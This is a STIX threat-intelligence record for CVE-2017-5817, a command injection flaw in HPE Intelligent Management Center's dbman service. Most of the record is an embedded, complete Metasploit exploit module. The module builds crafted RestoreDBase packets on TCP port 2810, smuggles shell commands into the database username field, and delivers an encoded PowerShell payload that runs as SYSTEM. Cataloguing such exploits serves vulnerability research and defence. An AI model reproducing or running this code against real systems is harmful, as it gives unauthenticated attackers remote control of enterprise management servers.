{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--279502a2-8472-461a-b052-b0aaa7f070ac",
    "created": "2024-08-14T16:46:12.886244Z",
    "modified": "2024-08-14T16:46:12.886248Z",
    "name": "HPE iMC dbman RestoreDBase Unauthenticated RCE",
    "description": " This module exploits a remote command execution vulnerablity in Hewlett Packard Enterprise Intelligent Management Center before version 7.3 E0504P04.  The dbman service allows unauthenticated remote users to restore a user-specified database (OpCode 10007), however the database connection username is not sanitized resulting in command injection allowing execution of arbitrary operating system commands as SYSTEM. This service listens on TCP port 2810 by default.  This module has been tested successfully on iMC PLAT v7.2 (E0403) on Windows 7 SP1 (EN).  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/hp_imc_dbman_restoredbase_unauth_rce.rb",
            "external_id": "hp_imc_dbman_restoredbase_unauth_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-5817"
        },
        {
            "source_name": "reference",
            "url": "https://h20564.www2.hpe.com/hpsc/doc/public/display?docId=emr_na-hpesbhf03745en_us"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Powershell\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HPE iMC dbman RestoreDBase Unauthenticated RCE',\n      'Description'    => %q{\n        This module exploits a remote command execution vulnerablity in\n        Hewlett Packard Enterprise Intelligent Management Center before\n        version 7.3 E0504P04.\n\n        The dbman service allows unauthenticated remote users to restore\n        a user-specified database (OpCode 10007), however the database\n        connection username is not sanitized resulting in command injection,\n        allowing execution of arbitrary operating system commands as SYSTEM.\n        This service listens on TCP port 2810 by default.\n\n        This module has been tested successfully on iMC PLAT v7.2 (E0403)\n        on Windows 7 SP1 (EN).\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'sztivi', # Discovery\n          'Chris Lyne', # Python PoC (@lynerc)\n          'bcoles' # Metasploit\n        ],\n      'References'     =>\n        [\n          ['CVE', '2017-5817'],\n          ['EDB', '43195'],\n          ['ZDI', '17-341'],\n          ['BID', '98469'],\n          ['URL', 'https://h20564.www2.hpe.com/hpsc/doc/public/display?docId=emr_na-hpesbhf03745en_us']\n        ],\n      'Platform'       => 'win',\n      'Targets'        => [['Automatic', {}]],\n      'Payload'        => { 'BadChars' => \"\\x00\" },\n      'DefaultOptions' => { 'WfsDelay' => 15 },\n      'Privileged'     => true,\n      'DisclosureDate' => '2017-05-15',\n      'DefaultTarget'  => 0))\n    register_options [Opt::RPORT(2810)]\n  end\n\n  def check\n    # empty RestoreDBase packet\n    pkt = [10007].pack('N')\n\n    connect\n    sock.put pkt\n    res = sock.get_once\n    disconnect\n\n    # Expected reply:\n    # \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00:08\\x02\\x01\\xFF\\x043Dbman deal msg error, please to see dbman_debug.log\"\n    return CheckCode::Detected if res =~ /dbman/i\n\n    CheckCode::Safe\n  end\n\n  def dbman_msg(database_user)\n    data = ''\n\n    db_ip = \"#{rand(255)}.#{rand(255)}.#{rand(255)}.#{rand(255)}\"\n    database_type = \"\\x03\" # MySQL\n    restore_type = 'MANUAL'\n    database_password = rand_text_alpha rand(1..5)\n    database_port = rand_text_alpha rand(1..5)\n    database_instance = rand_text_alpha rand(1..5)\n    junk = rand_text_alpha rand(1..5)\n\n    # database ip\n    data << \"\\x04\"\n    data << [db_ip.length].pack('C')\n    data << db_ip\n\n    # ???\n    data << \"\\x04\"\n    data << [junk.length].pack('C')\n    data << junk\n\n    # ???\n    data << \"\\x04\"\n    data << [junk.length].pack('C')\n    data << junk\n\n    # junk\n    data << \"\\x04\"\n    data << [junk.length].pack('C')\n    data << junk\n\n    # ???\n    data << \"\\x02\\x01\\x01\"\n\n    # database type\n    data << \"\\x02\"\n    data << [database_type.length].pack('C')\n    data << database_type\n\n    # restore type\n    data << \"\\x04\"\n    data << [restore_type.length].pack('C')\n    data << restore_type\n\n    # ???\n    data << \"\\x04\"\n    data << [junk.length].pack('C')\n    data << junk\n\n    # database user\n    data << \"\\x04\"\n    data << \"\\x82\"\n    data << [database_user.length].pack('n')\n    data << database_user\n\n    # database password\n    data << \"\\x04\"\n    data << [database_password.length].pack('C')\n    data << database_password\n\n    # database port\n    data << \"\\x04\"\n    data << [database_port.length].pack('C')\n    data << database_port\n\n    # database instance\n    data << \"\\x04\"\n    data << [database_instance.length].pack('C')\n    data << database_instance\n\n    # ???\n    data << \"\\x04\"\n    data << [junk.length].pack('C')\n    data << junk\n\n    # ???\n    data << \"\\x04\"\n    data << [junk.length].pack('C')\n    data << junk\n\n    # ???\n    data << \"\\x04\"\n    data << [junk.length].pack('C')\n    data << junk\n\n    # ???\n    data << \"\\x04\"\n    data << [junk.length].pack('C')\n    data << junk\n\n    # ???\n    data << \"\\x30\\x00\"\n    data << \"\\x02\\x01\\x01\"\n\n    data\n  end\n\n  def dbman_restoredbase_pkt(database_user)\n    data = dbman_msg database_user\n\n    # opcode 10007 (RestoreDBase)\n    pkt = [10007].pack('N')\n\n    # packet length\n    pkt << \"\\x00\\x00\"\n    pkt << [data.length + 4].pack('n')\n\n    # packet data length\n    pkt << \"\\x30\\x82\"\n    pkt << [data.length].pack('n')\n\n    # packet data\n    pkt << data\n\n    pkt\n  end\n\n  def execute_command(cmd, _opts = {})\n    connect\n    sock.put dbman_restoredbase_pkt \"\\\"& #{cmd} &\"\n    disconnect\n  end\n\n  def exploit\n    command = cmd_psh_payload(\n      payload.encoded,\n      payload_instance.arch.first,\n      { :remove_comspec => true, :encode_final_payload => true }\n    )\n\n    if command.length > 8000\n      fail_with Failure::BadConfig, \"#{peer} - The selected payload is too long to execute through Powershell in one command\"\n    end\n\n    print_status \"Sending payload (#{command.length} bytes)...\"\n    execute_command command\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-05-15",
    "x_mitre_platforms": [
        "win'"
    ]
}